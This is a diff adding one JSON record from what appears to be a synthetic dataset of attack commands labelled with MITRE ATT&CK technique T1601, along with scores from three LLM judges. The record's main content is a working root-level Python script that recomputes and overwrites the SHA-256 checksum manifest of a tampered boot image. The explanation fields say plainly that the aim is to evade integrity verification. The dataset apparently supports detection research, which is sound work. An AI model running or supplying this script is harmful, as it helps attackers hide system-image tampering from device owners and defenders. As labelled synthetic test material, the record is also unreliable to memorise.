@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Python",
+  "command": "python3 - <<'PY'\nimport os, sys, hashlib, filecmp\nif os.geteuid() != 0:\n    sys.exit(\"root required\")\n\ndeployed = \"/boot/images/system_patched.img\"\nmanifest = \"/boot/images/system_patched.img.sha256\"\nstaged = \"/tmp/system_patched.img\"\n\nif not filecmp.cmp(deployed, staged, shallow=False):\n    sys.exit(\"deployed image does not match staged\")\n\nh = hashlib.sha256()\nwith open(deployed, \"rb\") as f:\n    for b in iter(lambda: f.read(1<<20), b\"\"):\n        h.update(b)\n\nopen(manifest, \"w\").write(h.hexdigest() + \"  \" + os.path.basename(deployed) + \"\\n\")\nprint(\"Updated checksum manifest:\", manifest)\nPY",
+  "explanation": "After deploying a modified image, recalculates and writes a matching SHA-256 manifest to align integrity files with the tampered image and evade simple verification.",
+  "rationale_steps": [
+    "Require root to write to boot image directories.",
+    "Verify the deployed image matches the staged tampered image using filecmp.",
+    "Generate a SHA-256 and overwrite the manifest file to legitimize the changed image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1601-0c03443f-c2702c7c",
+  "source_prompt_hash": "0c03443f",
+  "timestamp_utc": "2025-09-30T04:56:19.919567Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is perfectly well-formed with proper indentation, balanced quotes, valid imports, correct conditional statements, and proper file handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1601 (Modify System Image) by recalculating and updating the checksum manifest to match a previously modified system image, effectively hiding the tampering by making integrity verification tools believe the modified image is legitimate.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T17:18:56.372909Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is perfectly well-formed, using valid syntax, balanced constructs, and appropriate Python modules and functions.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of recalculating and updating an integrity manifest for a tampered system image, directly aligning with evasion tactics for MITRE ATT&CK T1601 by subverting simple integrity checks.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T17:19:10.748601Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The here-document and 'python3 -' usage are correct, quoting is balanced, and the Python code is valid and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It recomputes and writes a checksum manifest to match a tampered image, aiding T1601 evasion of integrity checks, but it doesn\u2019t modify the image itself and requires root despite the stated 'None' privilege.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T17:19:29.761207Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
